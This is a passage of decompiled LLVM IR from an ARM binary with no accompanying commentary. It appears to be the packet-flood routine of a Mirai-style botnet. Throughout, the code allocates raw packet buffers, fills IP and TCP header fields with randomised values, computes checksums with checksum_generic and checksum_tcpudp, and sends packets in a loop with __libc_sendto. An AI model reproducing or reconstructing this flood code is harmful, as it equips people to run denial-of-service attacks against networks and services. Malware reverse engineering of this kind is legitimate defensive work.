  store i1 %v7_a030, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_a030, label %dec_label_pc_a4f4, label %dec_label_pc_a038

dec_label_pc_a038:                                ; preds = %dec_label_pc_a010
  store i32 %v7_9e48, i32* %r0.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %v0_a044 = load i32, i32* %fp.global-to-local, align 4
  %v0_a048 = load i32, i32* %sb.global-to-local, align 4
  %v3_a048 = mul i32 %v0_a048, 65536
  store i32 %v3_a048, i32* %sb.global-to-local, align 4
  %v3_a04c = urem i32 %v7_9e48, 65536
  store i32 %v3_a04c, i32* %r2.global-to-local, align 4
  %v3_a050 = urem i32 %v0_a044, 65536
  store i32 %v3_a050, i32* %r3.global-to-local, align 4
  %v3_a054 = urem i32 %v0_a048, 65536
  store i32 %v3_a054, i32* %ip.global-to-local, align 4
  %v2_a058 = icmp eq i32 %arg2, 0
  store i1 %v2_a058, i1* %cpsr_z.global-to-local, align 1
  %v0_a05c = load i32, i32* @sl, align 4
  store i32 %v0_a05c, i32* %stack_var_-44, align 4
  br i1 %v2_a058, label %dec_label_pc_a298.preheader, label %dec_label_pc_a070

dec_label_pc_a070:                                ; preds = %dec_label_pc_a038
  %v0_a080 = load i32, i32* @r8, align 4
  %v3_a080 = mul i32 %v0_a080, 65536
  %v1_a088 = add i32 %v3_a080, 2621440
  %tmp59 = mul i32 %v0_a044, 256
  %v3_a094 = and i32 %tmp59, 65280
  %tmp60 = mul i32 %v0_a048, 256
  %v3_a098 = and i32 %tmp60, 65280
  %tmp61 = udiv i32 %v0_a044, 256
  %v4_a0a0 = urem i32 %tmp61, 256
  %v5_a0a0 = or i32 %v4_a0a0, %v3_a094
  %tmp62 = udiv i32 %v1_a088, 256
  %v3_a0a4 = and i32 %tmp62, 65280
  %tmp63 = mul i32 %v7_9e48, 256
  %v3_a0a8 = and i32 %tmp63, 65280
  %tmp64 = udiv i32 %v0_a048, 256
  %v4_a0ac = urem i32 %tmp64, 256
  %v5_a0ac = or i32 %v4_a0ac, %v3_a098
  store i32 %v5_a0ac, i32* @fp, align 4
  %v4_a0bc = udiv i32 %v1_a088, 16777216
  %v5_a0bc = or i32 %v3_a0a4, %v4_a0bc
  store i32 %v5_a0bc, i32* @lr, align 4
  %tmp65 = udiv i32 %v7_9e48, 256
  %v4_a0c0 = urem i32 %tmp65, 256
  %v5_a0c0 = or i32 %v4_a0c0, %v3_a0a8
  store i32 %v5_a0c0, i32* @r5, align 4
  %tmp66 = mul i32 %v6_9edc, 256
  %v3_a0cc = and i32 %tmp66, 65280
  %v1_a0d0 = urem i32 %v6_9f10, 2
  %v1_a0d4 = urem i32 %v6_9f28, 2
  %tmp67 = udiv i32 %v6_9edc, 256
  %v4_a0d8 = urem i32 %tmp67, 256
  %v5_a0d8 = or i32 %v4_a0d8, %v3_a0cc
  %v1_a0e4 = urem i32 %v6_9f40, 2
  store i32 %v1_a0e4, i32* %r2.global-to-local, align 4
  %v1_a0e8 = urem i32 %v6_9f58, 2
  store i32 %v1_a0e8, i32* %r3.global-to-local, align 4
  store i32 %v6_9f70, i32* %ip.global-to-local, align 4
  store i32 %v6_9f88, i32* %r0.global-to-local, align 4
  store i32 %v6_9f40, i32* %r1.global-to-local, align 4
  %v1_a110 = urem i32 %v6_9f70, 2
  store i32 %v1_a110, i32* @sb, align 4
  store i32 %v0_a05c, i32* @r4, align 4
  %v1_a118 = urem i32 %v6_9f40, 256
  store i32 %v1_a118, i32* @r6, align 4
  %v1_a11c = urem i32 %v6_9f88, 2
  store i32 %v1_a11c, i32* @sl, align 4
  %sext = mul nuw i32 %v5_a0bc, 65536
  %v4_a190 = sdiv i32 %sext, 65536
  %sext6 = mul nuw i32 %v5_a0c0, 65536
  %v4_a198 = sdiv i32 %sext6, 65536
  %sext7 = mul nuw i32 %v5_a0a0, 65536
  %v4_a1b4 = sdiv i32 %sext7, 65536
  %tmp = sub nsw i32 0, %v1_a0d4
  %v4_a204 = and i32 %tmp, 16
  %tmp70 = sub nsw i32 0, %v1_a0e4
  %v4_a218 = and i32 %tmp70, 8
  %tmp71 = sub nsw i32 0, %v1_a0e8
  %v4_a22c = and i32 %tmp71, 4
  %v1_a184 = trunc i32 %v6_9e60 to i8
  br label %dec_label_pc_a120

dec_label_pc_a120:                                ; preds = %.thread9, %dec_label_pc_a070
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 1510, i32* %r0.global-to-local, align 4
  %v2_a12c = call i32 @calloc(i32 1510, i32 1)
  %v2_a134 = load i32, i32* @r4, align 4
  %v5_a134 = mul i32 %v2_a134, 4
  %v6_a134 = add i32 %v5_a134, %v2_9e0c
  %v7_a134 = inttoptr i32 %v6_a134 to i32*
  store i32 %v2_a12c, i32* %v7_a134, align 4
  %v3_a138 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_a138, i32* %r2.global-to-local, align 4
  %v5_a140 = mul i32 %v3_a138, 24
  %v1_a144 = load i32, i32* @r7, align 4
  %v2_a144 = add i32 %v1_a144, %v5_a140
  store i32 %v2_a144, i32* %r0.global-to-local, align 4
  store i32 %v2_9e0c, i32* %r3.global-to-local, align 4
  %v4_a14c = mul i32 %v3_a138, 4
  %v5_a14c = add i32 %v4_a14c, %v2_9e0c
  %v6_a14c = inttoptr i32 %v5_a14c to i32*
  %v7_a14c = load i32, i32* %v6_a14c, align 4
  store i32 %v7_a14c, i32* %r1.global-to-local, align 4
  %v1_a150 = inttoptr i32 %v7_a14c to i8*
  %v2_a150 = load i8, i8* %v1_a150, align 1
  %tmp72 = urem i8 %v2_a150, 16
  %v1_a154 = zext i8 %tmp72 to i32
  %v1_a158 = or i32 %v1_a154, 64
  store i32 %v1_a158, i32* %r3.global-to-local, align 4
  %v1_a15c = trunc i32 %v1_a158 to i8
  store i8 %v1_a15c, i8* %v1_a150, align 1
  %v0_a160 = load i32, i32* %r1.global-to-local, align 4
  %v1_a160 = inttoptr i32 %v0_a160 to i8*
  %v2_a160 = load i8, i8* %v1_a160, align 1
  %v1_a164 = and i8 %v2_a160, -16
  %v1_a168 = or i8 %v1_a164, 5
  store i32 %v1_9e8c, i32* %ip.global-to-local, align 4
  store i8 %v1_a168, i8* %v1_a160, align 1
  store i32 %v6_9e24, i32* %r2.global-to-local, align 4
  %v2_a178 = load i32, i32* %r1.global-to-local, align 4
  %v3_a178 = add i32 %v2_a178, 1
  %v4_a178 = inttoptr i32 %v3_a178 to i8*
  store i8 %v5_9e44, i8* %v4_a178, align 1
  store i32 %v1_9e68, i32* %r3.global-to-local, align 4
  %v0_a180 = load i32, i32* %ip.global-to-local, align 4
  %v2_a180 = icmp eq i32 %v0_a180, 0
  store i1 %v2_a180, i1* %cpsr_z.global-to-local, align 1
  %v2_a184 = load i32, i32* %r1.global-to-local, align 4
  %v3_a184 = add i32 %v2_a184, 8
  %v4_a184 = inttoptr i32 %v3_a184 to i8*
  store i8 %v1_a184, i8* %v4_a184, align 1
  %v0_a188 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_a188, label %.thread, label %bb

bb:                                               ; preds = %dec_label_pc_a120
  store i32 64, i32* %r3.global-to-local, align 4
  %v3_a18c = load i32, i32* %r1.global-to-local, align 4
  %v4_a18c = add i32 %v3_a18c, 6
  %v5_a18c = inttoptr i32 %v4_a18c to i16*
  store i16 64, i16* %v5_a18c, align 2
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_a120, %bb
  store i32 %v4_a190, i32* %ip.global-to-local, align 4
  store i32 6, i32* %r3.global-to-local, align 4
  store i32 %v4_a198, i32* %r2.global-to-local, align 4
  %v2_a19c = load i32, i32* %r1.global-to-local, align 4
  %v3_a19c = add i32 %v2_a19c, 9
  %v4_a19c = inttoptr i32 %v3_a19c to i8*
  store i8 6, i8* %v4_a19c, align 1
  %v0_a1a0 = load i32, i32* %ip.global-to-local, align 4
  %v1_a1a0 = trunc i32 %v0_a1a0 to i16
  %v2_a1a0 = load i32, i32* %r1.global-to-local, align 4
  %v3_a1a0 = add i32 %v2_a1a0, 2
  %v4_a1a0 = inttoptr i32 %v3_a1a0 to i16*
  store i16 %v1_a1a0, i16* %v4_a1a0, align 2
  store i32 %v6_9fdc, i32* %ip.global-to-local, align 4
  %v1_a1a8 = load i32, i32* %r1.global-to-local, align 4
  %v2_a1a8 = add i32 %v1_a1a8, 12
  %v3_a1a8 = inttoptr i32 %v2_a1a8 to i32*
  store i32 %v6_9fdc, i32* %v3_a1a8, align 4
  %v0_a1ac = load i32, i32* %r2.global-to-local, align 4
  %v1_a1ac = trunc i32 %v0_a1ac to i16
  %v2_a1ac = load i32, i32* %r1.global-to-local, align 4
  %v3_a1ac = add i32 %v2_a1ac, 4
  %v4_a1ac = inttoptr i32 %v3_a1ac to i16*
  store i16 %v1_a1ac, i16* %v4_a1ac, align 2
  %v0_a1b0 = load i32, i32* %r0.global-to-local, align 4
  %v1_a1b0 = add i32 %v0_a1b0, 16
  %v2_a1b0 = inttoptr i32 %v1_a1b0 to i32*
  %v3_a1b0 = load i32, i32* %v2_a1b0, align 4
  store i32 %v3_a1b0, i32* %r2.global-to-local, align 4
  store i32 %v4_a1b4, i32* %r0.global-to-local, align 4
  %v1_a1b8 = load i32, i32* %r1.global-to-local, align 4
  %v2_a1b8 = add i32 %v1_a1b8, 16
  %v3_a1b8 = inttoptr i32 %v2_a1b8 to i32*
  store i32 %v3_a1b0, i32* %v3_a1b8, align 4
  %v0_a1bc = load i32, i32* %r0.global-to-local, align 4
  %v1_a1bc = trunc i32 %v0_a1bc to i16
  %v2_a1bc = load i32, i32* %r1.global-to-local, align 4
  %v3_a1bc = add i32 %v2_a1bc, 20
  %v4_a1bc = inttoptr i32 %v3_a1bc to i16*
  store i16 %v1_a1bc, i16* %v4_a1bc, align 2
  %v0_a1c0 = load i32, i32* %r1.global-to-local, align 4
  %v1_a1c0 = add i32 %v0_a1c0, 20
  store i32 %v1_a1c0, i32* @r4, align 4
  %v1_a1c4 = add i32 %v0_a1c0, 32
  %v2_a1c4 = inttoptr i32 %v1_a1c4 to i8*
  %v3_a1c4 = load i8, i8* %v2_a1c4, align 1
  %v4_a1c4 = zext i8 %v3_a1c4 to i32
  %v1_a1c8 = and i32 %v4_a1c4, 95
  store i32 %v1_a1c8, i32* %r3.global-to-local, align 4
  %v1_a1cc = add i32 %v0_a1c0, 33
  %v2_a1cc = inttoptr i32 %v1_a1cc to i8*
  %v3_a1cc = load i8, i8* %v2_a1cc, align 1
  %v4_a1cc = zext i8 %v3_a1cc to i32
  store i32 %v4_a1cc, i32* %r2.global-to-local, align 4
  %v1_a1d0 = or i32 %v1_a1c8, 80
  %v1_a1d4 = add i32 %v0_a1c0, 40
  store i32 %v1_a1d4, i32* @r5, align 4
  store i32 %v1_a0d0, i32* %r1.global-to-local, align 4
  %v1_a1dc = trunc i32 %v1_a1d0 to i8
  store i8 %v1_a1dc, i8* %v2_a1c4, align 1
  store i32 %v5_a0d8, i32* %r3.global-to-local, align 4
  %v0_a1e4 = load i32, i32* %r2.global-to-local, align 4
  %v1_a1e4 = and i32 %v0_a1e4, -33
  %v1_a1e8 = load i32, i32* %r1.global-to-local, align 4
  %v4_a1e8 = mul i32 %v1_a1e8, 32
  %v5_a1e8 = or i32 %v4_a1e8, %v1_a1e4
  store i32 %v5_a1e8, i32* %r2.global-to-local, align 4
  %v1_a1ec = load i32, i32* @r4, align 4
  %v2_a1ec = add i32 %v1_a1ec, 4
  %v3_a1ec = inttoptr i32 %v2_a1ec to i32*
  store i32 %v5_a0d8, i32* %v3_a1ec, align 4
  %v0_a1f0 = load i32, i32* @fp, align 4
  %v1_a1f0 = trunc i32 %v0_a1f0 to i16
  %v2_a1f0 = load i32, i32* @r4, align 4
  %v3_a1f0 = add i32 %v2_a1f0, 2
  %v4_a1f0 = inttoptr i32 %v3_a1f0 to i16*
  store i16 %v1_a1f0, i16* %v4_a1f0, align 2
  %v0_a1f4 = load i32, i32* %r2.global-to-local, align 4
  %v1_a1f4 = trunc i32 %v0_a1f4 to i8
  %v2_a1f4 = load i32, i32* @r4, align 4
  %v3_a1f4 = add i32 %v2_a1f4, 13
  %v4_a1f4 = inttoptr i32 %v3_a1f4 to i8*
  store i8 %v1_a1f4, i8* %v4_a1f4, align 1
  %v0_a1f8 = load i32, i32* @r4, align 4
  %v1_a1f8 = add i32 %v0_a1f8, 13
  %v2_a1f8 = inttoptr i32 %v1_a1f8 to i8*
  %v3_a1f8 = load i8, i8* %v2_a1f8, align 1
  %v4_a1f8 = zext i8 %v3_a1f8 to i32
  store i32 %v1_a0d4, i32* %ip.global-to-local, align 4
  %v1_a200 = and i32 %v4_a1f8, 239
  %v5_a204 = or i32 %v1_a200, %v4_a204
  store i32 %v5_a204, i32* %r3.global-to-local, align 4
  %v1_a208 = trunc i32 %v5_a204 to i8
  store i8 %v1_a208, i8* %v2_a1f8, align 1
  %v0_a20c = load i32, i32* @r4, align 4
  %v1_a20c = add i32 %v0_a20c, 13
  %v2_a20c = inttoptr i32 %v1_a20c to i8*
  %v3_a20c = load i8, i8* %v2_a20c, align 1
  %v4_a20c = zext i8 %v3_a20c to i32
  store i32 %v1_a0e4, i32* %r0.global-to-local, align 4
  %v1_a214 = and i32 %v4_a20c, 247
  %v5_a218 = or i32 %v1_a214, %v4_a218
  store i32 %v5_a218, i32* %r2.global-to-local, align 4
  %v1_a21c = trunc i32 %v5_a218 to i8
  store i8 %v1_a21c, i8* %v2_a20c, align 1
  %v0_a220 = load i32, i32* @r4, align 4
  %v1_a220 = add i32 %v0_a220, 13
  %v2_a220 = inttoptr i32 %v1_a220 to i8*
  %v3_a220 = load i8, i8* %v2_a220, align 1
  %v4_a220 = zext i8 %v3_a220 to i32
  store i32 %v1_a0e8, i32* %r1.global-to-local, align 4
  %v1_a228 = and i32 %v4_a220, 251
  %v5_a22c = or i32 %v1_a228, %v4_a22c
  store i32 %v5_a22c, i32* %r3.global-to-local, align 4
  %v1_a230 = trunc i32 %v5_a22c to i8
  store i8 %v1_a230, i8* %v2_a220, align 1
  %v0_a234 = load i32, i32* @r4, align 4
  %v1_a234 = add i32 %v0_a234, 13
  %v2_a234 = inttoptr i32 %v1_a234 to i8*
  %v3_a234 = load i8, i8* %v2_a234, align 1
  %v4_a234 = zext i8 %v3_a234 to i32
  %v1_a238 = and i32 %v4_a234, 253
  %v1_a23c = load i32, i32* @sb, align 4
  %v3_a23c = mul i32 %v1_a23c, 2
  %v4_a23c = or i32 %v3_a23c, %v1_a238
  store i32 %v4_a23c, i32* %r2.global-to-local, align 4
  %v1_a240 = trunc i32 %v4_a23c to i8
  store i8 %v1_a240, i8* %v2_a234, align 1
  %v0_a244 = load i32, i32* @r4, align 4
  %v1_a244 = add i32 %v0_a244, 13
  %v2_a244 = inttoptr i32 %v1_a244 to i8*
  %v3_a244 = load i8, i8* %v2_a244, align 1
  %v4_a244 = zext i8 %v3_a244 to i32
  %v1_a248 = and i32 %v4_a244, 254
  %v0_a24c = load i32, i32* @sl, align 4
  %v2_a24c = or i32 %v1_a248, %v0_a24c
  store i32 %v2_a24c, i32* %r3.global-to-local, align 4
  %v1_a250 = trunc i32 %v2_a24c to i8
  store i8 %v1_a250, i8* %v2_a244, align 1
  %v0_a254 = call i32 @rand_next()
  %v1_a254 = trunc i32 %v0_a254 to i16
  store i32 %v0_a254, i32* %r0.global-to-local, align 4
  %v0_a258 = load i32, i32* @r6, align 4
  %v2_a258 = icmp eq i32 %v0_a258, 0
  store i1 %v2_a258, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_a258, label %.thread9, label %bb68

bb68:                                             ; preds = %.thread
  %v1_a25c = load i32, i32* @r4, align 4
  %v2_a25c = add i32 %v1_a25c, 13
  %v3_a25c = inttoptr i32 %v2_a25c to i8*
  %v4_a25c = load i8, i8* %v3_a25c, align 1
  %v5_a25c = zext i8 %v4_a25c to i32
  %v2_a260 = or i32 %v5_a25c, 8
  store i32 %v2_a260, i32* %r3.global-to-local, align 4
  %v2_a264 = trunc i32 %v2_a260 to i8
  store i8 %v2_a264, i8* %v3_a25c, align 1
  br label %.thread9

.thread9:                                         ; preds = %.thread, %bb68
  %v3_a268 = load i32, i32* @r4, align 4
  %v4_a268 = add i32 %v3_a268, 14
  %v5_a268 = inttoptr i32 %v4_a268 to i16*
  store i16 %v1_a254, i16* %v5_a268, align 2
  %v0_a26c = load i32, i32* @r8, align 4
  store i32 %v0_a26c, i32* %r1.global-to-local, align 4
  %v0_a270 = load i32, i32* @r5, align 4
  store i32 %v0_a270, i32* %r0.global-to-local, align 4
  %v2_a274 = call i32 @rand_alphastr(i32 %v0_a270, i32 %v0_a26c)
  store i32 %v2_a274, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_a27c = load i32, i32* @r5, align 4
  %v3_a27c = load i32, i32* @r8, align 4
  %v4_a27c = add i32 %v3_a27c, %v2_a27c
  %v5_a27c = inttoptr i32 %v4_a27c to i8*
  store i8 0, i8* %v5_a27c, align 1
  %v3_a280 = load i32, i32* %stack_var_-44, align 4
  %v1_a284 = add i32 %v3_a280, 1
  store i32 %v1_a284, i32* @r4, align 4
  store i32 %arg2, i32* %r2.global-to-local, align 4
  %v9_a28c = icmp eq i32 %v1_a284, %arg2
  store i1 %v9_a28c, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_a284, i32* %stack_var_-44, align 4
  %v5_a294 = icmp slt i32 %v1_a284, %arg2
  br i1 %v5_a294, label %dec_label_pc_a120, label %dec_label_pc_a298.preheader

dec_label_pc_a298.preheader:                      ; preds = %.thread9, %dec_label_pc_a038
  %v2_a2d4 = icmp eq i32 %v6_9fdc, -1
  %v7_a2d4 = icmp eq i32 %v6_9fdc, -1
  %v3_a448 = icmp eq i32 %v3_a04c, 65535
  %v2_a4ac = icmp eq i32 %v1_9fc8, 0
  br label %dec_label_pc_a298

dec_label_pc_a298:                                ; preds = %dec_label_pc_a298.preheader, %dec_label_pc_a4d4
  store i32 %arg2, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i1 %v2_a058, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_a058, label %dec_label_pc_a4d4, label %dec_label_pc_a2ac

dec_label_pc_a2ac:                                ; preds = %dec_label_pc_a298
  %v0_a2ac = load i32, i32* @r8, align 4
  %v3_a2ac = mul i32 %v0_a2ac, 65536
  %v1_a2b0 = add i32 %v3_a2ac, 1310720
  store i32 %v1_a2b0, i32* %r2.global-to-local, align 4
  %tmp69 = udiv i32 %v1_a2b0, 256
  %v3_a2b8 = and i32 %tmp69, 65280
  store i32 %v3_a2b8, i32* %r3.global-to-local, align 4
  %v4_a2bc = udiv i32 %v1_a2b0, 16777216
  %v5_a2bc = or i32 %v3_a2b8, %v4_a2bc
  store i32 %v5_a2bc, i32* @fp, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_a2c4 = add i32 %v0_a2ac, 20
  store i32 %v1_a2c4, i32* @sb, align 4
  %v1_a2c8 = add i32 %v0_a2ac, 40
  store i32 %v1_a2c8, i32* @sl, align 4
  br label %dec_label_pc_a3b4

dec_label_pc_a2d0:                                ; preds = %dec_label_pc_a3b4
  store i32 %v6_9fdc, i32* %r0.global-to-local, align 4
  store i1 %v7_a2d4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_a2d4, label %dec_label_pc_a438, label %dec_label_pc_a2dc

dec_label_pc_a2dc:                                ; preds = %dec_label_pc_a3d8, %dec_label_pc_a2d0
  store i32 %v3_a04c, i32* %r1.global-to-local, align 4
  store i32 65535, i32* @r4, align 4
  store i1 %v3_a448, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_a448, label %dec_label_pc_a454, label %dec_label_pc_a2f0

dec_label_pc_a2f0:                                ; preds = %dec_label_pc_a438.dec_label_pc_a2f0_crit_edge, %dec_label_pc_a2dc
  %v1_a2f4 = phi i32 [ %v1_a2f4.pre, %dec_label_pc_a438.dec_label_pc_a2f0_crit_edge ], [ 65535, %dec_label_pc_a2dc ]
  store i32 %v3_a050, i32* %r2.global-to-local, align 4
  %v9_a2f4 = icmp eq i32 %v3_a050, %v1_a2f4
  store i1 %v9_a2f4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_a2f4, label %dec_label_pc_a468, label %dec_label_pc_a2fc

dec_label_pc_a2fc:                                ; preds = %dec_label_pc_a454.dec_label_pc_a2fc_crit_edge, %dec_label_pc_a2f0
  %v1_a300 = phi i32 [ %v1_a300.pre, %dec_label_pc_a454.dec_label_pc_a2fc_crit_edge ], [ %v1_a2f4, %dec_label_pc_a2f0 ]
  store i32 %v3_a054, i32* %r3.global-to-local, align 4
  %v9_a300 = icmp eq i32 %v3_a054, %v1_a300
  store i1 %v9_a300, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_a300, label %dec_label_pc_a47c, label %dec_label_pc_a308

dec_label_pc_a308:                                ; preds = %dec_label_pc_a468.dec_label_pc_a308_crit_edge, %dec_label_pc_a2fc
  %v1_a30c = phi i32 [ %v1_a30c.pre, %dec_label_pc_a468.dec_label_pc_a308_crit_edge ], [ %v1_a300, %dec_label_pc_a2fc ]
  store i32 %v6_9edc, i32* %ip.global-to-local, align 4
  %v9_a30c = icmp eq i32 %v6_9edc, %v1_a30c
  store i1 %v9_a30c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_a30c, label %dec_label_pc_a490, label %dec_label_pc_a314

dec_label_pc_a314:                                ; preds = %dec_label_pc_a47c.dec_label_pc_a314_crit_edge, %dec_label_pc_a308
  %v1_a318 = phi i32 [ %v1_a318.pre, %dec_label_pc_a47c.dec_label_pc_a314_crit_edge ], [ %v1_a30c, %dec_label_pc_a308 ]
  store i32 %v6_9ef8, i32* %r0.global-to-local, align 4
  %v9_a318 = icmp eq i32 %v6_9ef8, %v1_a318
  store i1 %v9_a318, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_a318, label %dec_label_pc_a4a4, label %dec_label_pc_a320

dec_label_pc_a320:                                ; preds = %dec_label_pc_a490, %dec_label_pc_a314
  store i32 %v1_9fc8, i32* %r1.global-to-local, align 4
  store i1 %v2_a4ac, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_a4ac, label %dec_label_pc_a32c, label %dec_label_pc_a4b8

dec_label_pc_a32c:                                ; preds = %dec_label_pc_a320, %dec_label_pc_a4a4, %dec_label_pc_a4b8
  store i32 0, i32* %r2.global-to-local, align 4
  %v2_a330 = load i32, i32* @r5, align 4
  %v3_a330 = add i32 %v2_a330, 10
  %v4_a330 = inttoptr i32 %v3_a330 to i16*
  store i16 0, i16* %v4_a330, align 2
  store i32 20, i32* %r1.global-to-local, align 4
  %v0_a338 = load i32, i32* @r5, align 4
  store i32 %v0_a338, i32* @r0, align 4
  %v2_a33c = call i32 @checksum_generic(i32 %v0_a338, i32 20)
  %v3_a33c = trunc i32 %v2_a33c to i16
  store i32 0, i32* %r3.global-to-local, align 4
  %v3_a344 = load i32, i32* @r5, align 4
  %v4_a344 = add i32 %v3_a344, 10
  %v5_a344 = inttoptr i32 %v4_a344 to i16*
  store i16 %v3_a33c, i16* %v5_a344, align 2
  %v0_a348 = load i32, i32* @r6, align 4
  store i32 %v0_a348, i32* @r1, align 4
  %v0_a34c = load i32, i32* %r3.global-to-local, align 4
  %v1_a34c = trunc i32 %v0_a34c to i16
  %v3_a34c = add i32 %v0_a348, 16
  %v4_a34c = inttoptr i32 %v3_a34c to i16*
  store i16 %v1_a34c, i16* %v4_a34c, align 2
  %v0_a350 = load i32, i32* @fp, align 4
  store i32 %v0_a350, i32* %r2.global-to-local, align 4
  %v0_a354 = load i32, i32* @sb, align 4
  store i32 %v0_a354, i32* %r3.global-to-local, align 4
  %v0_a358 = load i32, i32* @r5, align 4
  store i32 %v0_a358, i32* %r0.global-to-local, align 4
  %v4_a35c = call i32 @checksum_tcpudp(i32 %v0_a358, i32 %v0_a348, i32 %v0_a350, i32 %v0_a354)
  %v5_a35c = trunc i32 %v4_a35c to i16
  store i32 %v4_a35c, i32* %r0.global-to-local, align 4
  %v3_a360 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_a360, i32* %r3.global-to-local, align 4
  %v3_a364 = mul i32 %v3_a360, 32
  store i32 %v3_a364, i32* %lr.global-to-local, align 4
  %v3_a368 = load i32, i32* @r6, align 4
  %v4_a368 = add i32 %v3_a368, 16
  %v5_a368 = inttoptr i32 %v4_a368 to i16*
  store i16 %v5_a35c, i16* %v5_a368, align 2
  %v0_a36c = load i32, i32* %lr.global-to-local, align 4
  %v1_a36c = load i32, i32* %r3.global-to-local, align 4
  %tmp73 = mul i32 %v1_a36c, -8
  %v5_a36c = add i32 %v0_a36c, %tmp73
  store i32 %v5_a36c, i32* %lr.global-to-local, align 4
  %v0_a370 = load i32, i32* @r6, align 4
  %v1_a370 = add i32 %v0_a370, 2
  %v2_a370 = inttoptr i32 %v1_a370 to i16*
  %v3_a370 = load i16, i16* %v2_a370, align 2
  %v4_a370 = zext i16 %v3_a370 to i32
  store i32 %v4_a370, i32* @r6, align 4
  %v1_a374 = load i32, i32* @r7, align 4
  %v2_a374 = add i32 %v1_a374, %v5_a36c
  store i32 %v2_a374, i32* @lr, align 4
  %v3_a378 = add i32 %v2_a374, 2
  %v4_a378 = inttoptr i32 %v3_a378 to i16*
  store i16 %v3_a370, i16* %v4_a378, align 2
  store i32 16, i32* %ip.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_a384 = load i32, i32* @r5, align 4
  store i32 %v0_a384, i32* %r1.global-to-local, align 4
  store i32 %v3_a000, i32* %r0.global-to-local, align 4
  %v0_a38c = load i32, i32* @sl, align 4
  store i32 %v0_a38c, i32* %r2.global-to-local, align 4
  %v0_a394 = load i32, i32* @lr, align 4
  %v6_a398 = call i32 @__libc_sendto(i32 %v3_a000, i32 %v0_a384, i32 %v0_a38c, i32 16384, i32 %v0_a394, i32 16)
  %v3_a39c = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_a39c, i32* %r3.global-to-local, align 4
  store i32 %arg2, i32* %ip.global-to-local, align 4
  %v1_a3a4 = add i32 %v3_a39c, 1
  store i32 %v1_a3a4, i32* %r0.global-to-local, align 4
  %v9_a3a8 = icmp eq i32 %v1_a3a4, %arg2
  store i1 %v9_a3a8, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_a3a4, i32* %stack_var_-44, align 4
  %v6_a3b0 = icmp slt i32 %v1_a3a4, %arg2
  br i1 %v6_a3b0, label %dec_label_pc_a3b4, label %dec_label_pc_a4d4

dec_label_pc_a3b4:                                ; preds = %dec_label_pc_a32c, %dec_label_pc_a2ac
  %v1_a3c8 = phi i32 [ %v1_a3a4, %dec_label_pc_a32c ], [ 0, %dec_label_pc_a2ac ]
  %v5_a3b8 = mul i32 %v1_a3c8, 24
  %v1_a3bc = load i32, i32* @r7, align 4
  %v2_a3bc = add i32 %v1_a3bc, %v5_a3b8
  store i32 %v2_a3bc, i32* %r3.global-to-local, align 4
  store i32 %v2_9e0c, i32* %ip.global-to-local, align 4
  %v1_a3c4 = add i32 %v2_a3bc, 20
  %v2_a3c4 = inttoptr i32 %v1_a3c4 to i8*
  %v3_a3c4 = load i8, i8* %v2_a3c4, align 1
  %v4_a3c4 = zext i8 %v3_a3c4 to i32
  store i32 %v4_a3c4, i32* %r2.global-to-local, align 4
  %v4_a3c8 = mul i32 %v1_a3c8, 4
  %v5_a3c8 = add i32 %v4_a3c8, %v2_9e0c
  %v6_a3c8 = inttoptr i32 %v5_a3c8 to i32*
  %v7_a3c8 = load i32, i32* %v6_a3c8, align 4
  store i32 %v7_a3c8, i32* @r5, align 4
  %v2_a3cc = icmp ugt i8 %v3_a3c4, 30
  %v7_a3cc = icmp eq i8 %v3_a3c4, 31
  store i1 %v7_a3cc, i1* %cpsr_z.global-to-local, align 1
  %v1_a3d0 = add i32 %v7_a3c8, 20
  store i32 %v1_a3d0, i32* @r6, align 4
  %v2_a3d4 = xor i1 %v7_a3cc, true
  %v3_a3d4 = and i1 %v2_a3cc, %v2_a3d4
  br i1 %v3_a3d4, label %dec_label_pc_a2d0, label %dec_label_pc_a3d8

dec_label_pc_a3d8:                                ; preds = %dec_label_pc_a3b4
  %v1_a3d8 = add i32 %v2_a3bc, 16
  %v2_a3d8 = inttoptr i32 %v1_a3d8 to i32*
  %v3_a3d8 = load i32, i32* %v2_a3d8, align 4
  %v0_a3dc = call i32 @rand_next()
  store i32 %v0_a3dc, i32* %r0.global-to-local, align 4
  %v3_a3e0 = load i32, i32* %stack_var_-44, align 4
  %v5_a3e8 = mul i32 %v3_a3e0, 24
  %v1_a3ec = and i32 %v3_a3d8, 16711680
  store i32 %v1_a3ec, i32* %ip.global-to-local, align 4
  %v3_a3f0 = udiv i32 %v3_a3d8, 16777216
  %v4_a3f4 = udiv i32 %v1_a3ec, 256
  %v5_a3f4 = or i32 %v4_a3f4, %v3_a3f0
  store i32 %v5_a3f4, i32* %r2.global-to-local, align 4
  %v1_a3f8 = load i32, i32* @r7, align 4
  %v2_a3f8 = add i32 %v1_a3f8, %v5_a3e8
  store i32 %v2_a3f8, i32* %r1.global-to-local, align 4
  %v1_a3fc = and i32 %v3_a3d8, ptrtoint (i32* @global_var_ff00.28 to i32)
  store i32 %v1_a3fc, i32* %r3.global-to-local, align 4
  %v1_a400 = add i32 %v2_a3f8, 20
  %v2_a400 = inttoptr i32 %v1_a400 to i8*
  %v3_a400 = load i8, i8* %v2_a400, align 1
  %v4_a400 = zext i8 %v3_a400 to i32
  store i32 %v4_a400, i32* %ip.global-to-local, align 4
